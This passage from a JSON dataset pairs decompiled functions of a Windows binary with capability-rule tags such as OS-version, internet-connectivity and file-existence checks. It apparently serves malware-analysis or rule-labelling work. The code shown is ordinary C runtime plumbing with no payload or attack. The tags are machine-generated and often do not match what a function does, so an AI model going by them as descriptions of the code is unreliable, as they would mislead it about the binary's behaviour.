   *(unaff_EBP - 0x38) = iVar2;\n        if (iVar2 == 0) goto code_r0x0040a696;\n        *(unaff_EBP - 0x50) = 1;\n    }\n    unique0x00007a00 = *(unaff_EBP + 0x14);\n    var_30h_2 = 1;\n    var_34h_3 = *(unaff_EBP + 0x20);\n    _auStack48 = puVar5;\n    var_54h = iVar2;\n    var_50h_2 = iVar7;\n    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar2 != 0) {\n        arg_8h_00 = &fcn.0040a31f::var_34h_3;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 0x20), 9, *(unaff_EBP - 0x34), *(unaff_EBP + 0x1c), 0, 0);\n        *(unaff_EBP - 0x54) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP - 4) = 1;\n            fcn.00402830();\n            *(unaff_EBP - 0x18) = &fcn.0040a31f::var_34h_3;\n            *(unaff_EBP - 0x58) = &fcn.0040a31f::var_34h_3;\n            *(unaff_EBP - 4) = 0xffffffff;\n            if (*0x10 == 0x38) {\n                arg_8h_00 = fcn.0040162a(iVar2 * 2);\n                if (arg_8h_00 == NULL) goto code_r0x0040a5d1;\n                *(unaff_EBP - 0x44) = 1;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x20), 1, *(unaff_EBP - 0x34), *(unaff_EBP + 0x1c), arg_8h_00, iVar2);\n            if (iVar6 != 0) {\n                uVar8 = (*_sym.imp.KERNEL32.dll_CompareStringW)\n                                  (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP - 0x38), iVar7, arg_8h_00, iVar2);\n                *(unaff_EBP - 0x48) = uVar8;\n            }\n            if (*(unaff_EBP - 0x44) != 0) {\n                fcn.00401512(arg_8h_00);\n            }\n        }\n    }\ncode_r0x0040a5d1:\n    if (*(unaff_EBP - 0x50) != 0) {\n        fcn.00401512(*(unaff_EBP - 0x38));\n    }\ncode_r0x0040a696:\n    *(unaff_EBP - 0x68) = 0x40a6a3;\n    fcn.00403eac();\n    *(unaff_EBP - 0x68) = 0x40a6a8;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 3136
    },
    "0040a6f6": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0040a6f6(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (unaff_EDI != NULL) {\n        iVar1 = *unaff_EDI;\n        piVar2 = unaff_EDI;\n        while (iVar1 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = *piVar2;\n        }\n        piVar2 = fcn.0040162a(iVar3 * 4 + 4);\n        if (piVar2 == NULL) {\n            fcn.0040129e(9);\n        }\n        iVar3 = *unaff_EDI;\n        piVar4 = piVar2;\n        while (iVar3 != 0) {\n            iVar3 = fcn.0040a92d(iVar3);\n            *piVar4 = iVar3;\n            piVar4 = piVar4 + 1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar3 = *unaff_EDI;\n        }\n        *piVar4 = 0;\n        return piVar2;\n    }\n    return unaff_EDI;\n}\n",
        "token_count": 310
    },
    "0040a757": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a757(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint lpValue;\n    \n    var_10h = 0;\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (arg_8h_00 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.0040a958(arg_8h_00, 0x3d);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_8h_00 == iVar1) {\n        return 0xffffffff;\n    }\n    bVar6 = *(iVar1 + 1) == '\\0';\n    if (*0x45d370 == *0x45d374) {\n        *0x45d370 = fcn.0040a6f6();\n    }\n    if (*0x45d370 == NULL) {\n        if ((arg_ch != 0) && (*0x45d378 != NULL)) {\n            iVar2 = fcn.0040a273();\n            if (iVar2 != 0) {\n                return 0xffffffff;\n            }\n            goto code_r0x0040a80c;\n        }\n        if (!bVar6) {\n            *0x45d370 = fcn.0040162a(4);\n            if (*0x45d370 == NULL) {\n                return 0xffffffff;\n            }\n            **0x45d370 = 0;\n            if (*0x45d378 == NULL) {\n                *0x45d378 = fcn.0040162a(4);\n                if (*0x45d378 == NULL) {\n                    return 0xffffffff;\n                }\n                **0x45d378 = 0;\n            }\n            goto code_r0x0040a80c;\n        }\ncode_r0x0040a7da:\n        var_10h = 0;\n    }\n    else {\ncode_r0x0040a80c:\n        piVar3 = *0x45d370;\n        iVar2 = fcn.0040a6a9(arg_8h_00);\n        if ((iVar2 < 0) || (*piVar3 == 0)) {\n            if (bVar6) {\n                fcn.00401512(arg_8h_00);\n                *arg_8h = 0;\n                goto code_r0x0040a7da;\n            }\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n            }\n            piVar3 = fcn.00405c4d(*0x45d370, iVar2 * 4 + 8);\n            if (piVar3 == NULL) {\n                return 0xffffffff;\n            }\n            (piVar3 + iVar2)[1] = 0;\n            piVar3[iVar2] = arg_8h_00;\n            *arg_8h = 0;\ncode_r0x0040a8af:\n            *0x45d370 = piVar3;\n        }\n        else {\n            piVar5 = piVar3 + iVar2;\n            fcn.00401512(*piVar5);\n            if (bVar6) {\n                while (*piVar5 != 0) {\n                    iVar2 = iVar2 + 1;\n                    *piVar5 = piVar5[1];\n                    piVar5 = piVar3 + iVar2;\n                }\n                piVar3 = fcn.00405c4d(*0x45d370, iVar2 << 2);\n                if (piVar3 != NULL) goto code_r0x0040a8af;\n            }\n            else {\n                *piVar5 = arg_8h_00;\n                *arg_8h = 0;\n            }\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.00403df0(arg_8h_00);\n            iVar2 = fcn.0040162a(iVar2 + 2);\n            if (iVar2 != 0) {\n                fcn.00403bc0(iVar2, arg_8h_00);\n                puVar4 = (iVar2 - arg_8h_00) + iVar1;\n                *puVar4 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar2, ~-bVar6 & puVar4 + 1);\n                if (iVar1 == 0) {\n                    var_10h = 0xffffffff;\n                }\n                fcn.00401512(iVar2);\n            }\n        }\n        if (bVar6) {\n            fcn.00401512(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1129
    },
    "0040a958": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.0040a958(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    iVar3 = fcn.00402306();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x45d7f4) {\n        iVar3 = fcn.00404203();\n    }\n    if (*(iVar3 + 8) == 0) {\n        uVar7 = arg_8h & 3;\n        while (uVar7 != 0) {\n            if (*arg_8h == arg_ch) {\n                return arg_8h;\n            }\n            if (*arg_8h == 0) {\n                return NULL;\n            }\n            uVar7 = arg_8h + 1 & 3;\n            arg_8h = arg_8h + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar7 = *arg_8h;\n                uVar6 = uVar7 ^ CONCAT22(CONCAT11(arg_ch, arg_ch), CONCAT11(arg_ch, arg_ch));\n                uVar4 = uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff;\n                puVar5 = arg_8h + 1;\n                if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n                arg_8h = puVar5;\n                if ((uVar4 & 0x81010100) != 0) {\n                    if ((uVar4 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar7 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar7 = *arg_8h;\n            if (uVar7 == arg_ch) {\n                return arg_8h;\n            }\n            if (uVar7 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 8;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 1;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = uVar7 >> 0x10;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 2;\n            }\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 0x18;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 3;\n            }\n            arg_8h = puVar5;\n            if (uVar2 == 0) {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar7 = uVar2;\n        if (uVar2 == 0) break;\n        if ((*(uVar7 + 0x1d + iVar3) & 4) == 0) {\n            puVar5 = arg_8h;\n            if (arg_ch == uVar7) break;\n        }\n        else {\n            uVar1 = *(arg_8h + 1);\n            if (uVar1 == 0) {\n                return NULL;\n            }\n            puVar5 = arg_8h + 1;\n            if (arg_ch == CONCAT11(uVar2, uVar1)) {\n                return arg_8h;\n            }\n        }\n        arg_8h = puVar5 + 1;\n    }\n    return ~-(arg_ch != uVar7) & arg_8h;\n}\n",
        "token_count": 883
    },
    "00401583": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401583(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t arg_8h_00;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40b960, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((*0x45da44 == 3) && (arg_8h_00 <= *0x45da30)) {\n        fcn.004029d8(4);\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.0040368a(arg_8h_00);\n        *(unaff_EBP + -0x1c) = uVar1;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004015f5();\n        if (*(unaff_EBP + -0x1c) != 0) goto code_r0x004015ec;\n    }\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = 1;\n    }\n    if (*0x45da44 != 1) {\n        arg_8h_00 = arg_8h_00 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45da40, 0, arg_8h_00);\ncode_r0x004015ec:\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 370
    },
    "00401821": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401821(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uchar auStack276 [4];\n    uchar auStack272 [124];\n    uchar auStack148 [136];\n    uchar uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x45cca0 ^ auStack148;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x45ca28)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x45ca28)) {\n        if ((*0x45d348 == 1) || ((*0x45d348 == 0 && (*0x45ca24 == 1)))) {\n            uStack292 = 0;\n            puStack296 = auStack276;\n            uStack300 = *(uVar1 * 8 + 0x45ca2c);\n            uStack300 = fcn.00403df0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack292 = 0x104;\n            puStack296 = auStack272;\n            uStack300 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.00403bc0();\n            }\n            iVar2 = fcn.00403df0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.00403df0();\n                fcn.00403cc0();\n            }\n            fcn.00403df0();\n            fcn.00403df0();\n            fcn.00402830();\n            fcn.00403bc0();\n            fcn.00403bd0();\n            fcn.00403bd0();\n            fcn.00403bd0(&uStack300);\n            fcn.00403abd(&uStack300, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 543
    },
    "00401a28": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a28(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = fcn.00402306();\n    piVar1 = *(iVar4 + 0x54);\n    piVar7 = piVar1;\n    do {\n        if (*piVar7 == arg_8h) break;\n        piVar7 = piVar7 + 3;\n    } while (piVar7 < piVar1 + *0x45cb44 * 3);\n    if ((piVar1 + *0x45cb44 * 3 <= piVar7) || (*piVar7 != arg_8h)) {\n        piVar7 = NULL;\n    }\n    if ((piVar7 == NULL) || (pcVar2 = piVar7[2],  pcVar2 == NULL)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar2 == 0x5) {\n        piVar7[2] = 0;\n        uVar5 = 1;\n    }\n    else {\n        if (pcVar2 != 0x1) {\n            uVar5 = *(iVar4 + 0x58);\n            *(iVar4 + 0x58) = ExceptionInfo;\n            if (piVar7[1] == 8) {\n                if (*0x45cb38 < *0x45cb3c + *0x45cb38) {\n                    iVar6 = *0x45cb38 * 0xc;\n                    iVar8 = *0x45cb38;\n                    do {\n                        *(iVar6 + 8 + *(iVar4 + 0x54)) = 0;\n                        iVar8 = iVar8 + 1;\n                        iVar6 = iVar6 + 0xc;\n                    } while (iVar8 < *0x45cb3c + *0x45cb38);\n                }\n                iVar8 = *piVar7;\n                uVar3 = *(iVar4 + 0x5c);\n                if (iVar8 == -0x3fffff72) {\n                    *(iVar4 + 0x5c) = 0x83;\n                }\n                else if (iVar8 == -0x3fffff70) {\n                    *(iVar4 + 0x5c) = 0x81;\n                }\n                else if (iVar8 == -0x3fffff6f) {\n                    *(iVar4 + 0x5c) = 0x84;\n                }\n                else if (iVar8 == -0x3fffff6d) {\n                    *(iVar4 + 0x5c) = 0x85;\n                }\n                else if (iVar8 == -0x3fffff73) {\n                    *(iVar4 + 0x5c) = 0x82;\n                }\n                else if (iVar8 == -0x3fffff71) {\n                    *(iVar4 + 0x5c) = 0x86;\n                }\n                else if (iVar8 == -0x3fffff6e) {\n                    *(iVar4 + 0x5c) = 0x8a;\n                }\n                (*pcVar2)(8, *(iVar4 + 0x5c));\n                *(iVar4 + 0x5c) = uVar3;\n            }\n            else {\n                piVar7[2] = 0;\n                (*pcVar2)(piVar7[1]);\n            }\n            *(iVar4 + 0x58) = uVar5;\n        }\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 853
    },
    "004022d6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004022d6(void)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    int32_t *piVar2;\n    \n    if (*0x45cb6c != -1) {\n        (**0x45d4b0)(*0x45cb6c);\n        *0x45cb6c = -1;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n    piVar2 = 0x45cb80;\n    do {\n        arg_8h = *piVar2;\n        if ((arg_8h != 0) && (piVar2[1] != 1)) {\n            (*pcVar1)(arg_8h);\n            fcn.00401512(arg_8h);\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x45cca0);\n    piVar2 = 0x45cb80;\n    do {\n        if ((*piVar2 != 0) && (piVar2[1] == 1)) {\n            (*pcVar1)(*piVar2);\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x45cca0);\n    return;\n}\n",
        "token_count": 290
    },
    "004025e8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004025e8(void)\n\n{\n    if ((*0x45d350 == 2) && (4 < *0x45d35c)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 50
    },
    "00403abd": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403abd(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x45d610 == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) ||\n           (*0x45d610 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\"),  *0x45d610 == NULL)) {\n            return 0;\n        }\n        *0x45d614 = (*pcVar1)(iVar2, \"GetActiveWindow\");\n        *0x45d618 = (*pcVar1)(iVar2, \"GetLastActivePopup\");\n        if ((*0x45d350 == 2) && (*0x45d620 = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x45d620 != NULL)) {\n            *0x45d61c = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x45d61c == NULL) ||\n       (((iVar2 = (**0x45d61c)(),  iVar2 != 0 && (iVar2 = (**0x45d620)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x45d614 != NULL) && (iVar4 = (**0x45d614)(),  iVar4 != 0)) && (*0x45d618 != NULL)) {\n            iVar4 = (**0x45d618)(iVar4);\n        }\n    }\n    else if (*0x45d35c < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x45d610)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 554
    },
    "00404068": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404068(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uchar *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint noname_10;\n    uchar *noname_3;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uchar *arg_8h;\n    uint in_stack_fffffae4;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uchar auStack1180 [404];\n    uchar auStack776 [256];\n    uchar auStack520 [256];\n    uint auStack264 [64];\n    uint32_t uStack8;\n    \n    uStack8 = *0x45cca0 ^ auStack1180;\n    arg_8h = &stack0xfffffae4;\n    noname_7 = *0x45d904;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(auStack264 + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        uVar1 = in_stack_fffffae8 >> 0x10;\n        auStack264[0]._0_1_ = 0x20;\n        if (uVar1 != 0) {\n            puVar8 = &stack0xfffffaeb;\n            do {\n                uVar3 = uVar1;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = auStack264 + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                uVar1 = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (uVar1 != 0);\n        }\n        noname_14_00 = 0;\n        noname_3 = &stack0xfffffaf8;\n        noname_10 = 0x100;\n        puVar9 = auStack264;\n        noname_8_00 = 1;\n        noname_12 = *0x45d904;\n        noname_13_00 = *0x45d7f0;\n        fcn.00406450(1, puVar9, 0x100, noname_3, *0x45d904, *0x45d7f0, 0, noname_7, arg_8h, unaff_ESI, in_stack_fffffae4\n                     , in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = auStack520;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = auStack264;\n        noname_9 = 0x100;\n        noname_8 = *0x45d7f0;\n        noname_14 = *0x45d904;\n        fcn.0040607a(*0x45d7f0, 0x100, noname_2, 0x100, noname_4, 0x100, *0x45d904, 0, noname_8_00, puVar9, noname_10, \n                     noname_3, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, in_stack_fffffae4, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.0040607a(*0x45d7f0, 0x200, auStack264, 0x100, auStack776, 0x100, *0x45d904, 0, noname_8, noname_9, noname_2\n                     , noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, puVar9, noname_10, noname_3, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, in_stack_fffffae4);\n        uVar3 = 0;\n        do {\n            if ((*(&stack0xfffffaf8 + uVar3 * 2) & 1) == 0) {\n                if ((*(&stack0xfffffaf8 + uVar3 * 2) & 2) != 0) {\n                    *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | 0x20;\n                    uVar4 = auStack776[uVar3];\n                    goto code_r0x0040417e;\n                }\n                *(uVar3 + 0x45d920) = 0;\n            }\n            else {\n                *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | 0x10;\n                uVar4 = auStack520[uVar3];\ncode_r0x0040417e:\n                *(uVar3 + 0x45d920) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        do {\n            if ((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x004041c1;\n                }\n                *(uVar3 + 0x45d920) = 0;\n            }\n            else {\n                *(uVar3 + 0x45d801) = *(uVar3 + 0x45d801) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x004041c1:\n                *(uVar3 + 0x45d920) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 1827
    },
    "004048dd": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004048dd(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.004026d8(0x40bf00, 0x10);\n    if (*0x45d628 == NULL) {\n        if (*0x45d350 != 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n            if (iVar2 != 0) {\n                *0x45d628 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"InitializeCriticalSectionAndSpinCount\");\n                if (*0x45d628 != NULL) goto code_r0x00404929;\n            }\n        }\n        *0x45d628 = 0x4048cd;\n    }\ncode_r0x00404929:\n    pcVar1 = *0x45d628;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x20) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 334
    },
    "00404fa2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404fa2(uint param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    int32_t in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint32_t arg_1ch;\n    uint32_t in_stack_fffffe50;\n    int32_t iStack420;\n    int32_t iStack404;\n    int32_t iStack400;\n    uchar uStack396;\n    uint8_t auStack395 [255];\n    uchar auStack140 [20];\n    uchar auStack120 [112];\n    uint32_t uStack8;\n    \n    uStack8 = *0x45cca0 ^ auStack120;\n    iVar4 = fcn.00404e42(param_1, auStack140, &stack0xfffffe50, &iStack404);\n    if (iVar4 != 0) {\n        iVar9 = unaff_ESI * 0xc;\n        iVar4 = fcn.00407fc0(auStack140, *(iVar9 + 0x45cf3c));\n        if (iVar4 != 0) {\n            iVar4 = fcn.00403df0(auStack140);\n            iVar4 = fcn.0040162a(iVar4 + 1);\n            if (iVar4 != 0) {\n                arg_8h = *(iVar9 + 0x45cf3c);\n                puVar1 = unaff_ESI * 4 + 0x45d688;\n                arg_1ch = *puVar1;\n                iStack400 = unaff_ESI * 6 + 0x45d6e0;\n                fcn.00404590(&stack0xfffffe3c, iStack400, 6);\n                iVar3 = *0x45d6a0;\n                uVar5 = fcn.00403bc0(iVar4, auStack140);\n                *(iVar9 + 0x45cf3c) = uVar5;\n                *puVar1 = in_stack_fffffe50 & 0xffff;\n                fcn.00404590(iStack400, &stack0xfffffe50, 6);\n                uVar8 = *0x45d108;\n                if (unaff_ESI == 2) {\n                    iStack400 = 0;\n                    *0x45d6a0 = iStack404;\n                    iStack420 = *0x45ce24;\n                    piVar6 = 0x45ce00;\n                    iVar7 = *0x45ce20;\n                    do {\n                        if (iStack404 == *piVar6) {\n                            if (iStack400 != 0) {\n                                iVar2 = iStack400 * 8;\n                                *0x45ce00 = *(iVar2 + 0x45ce00);\n                                *0x45ce04 = *(iVar2 + 0x45ce04);\n                                *(iVar2 + 0x45ce00) = iVar7;\n                                *(iVar2 + 0x45ce04) = iStack420;\n                            }\n                            break;\n                        }\n                        in_stack_fffffe44 = 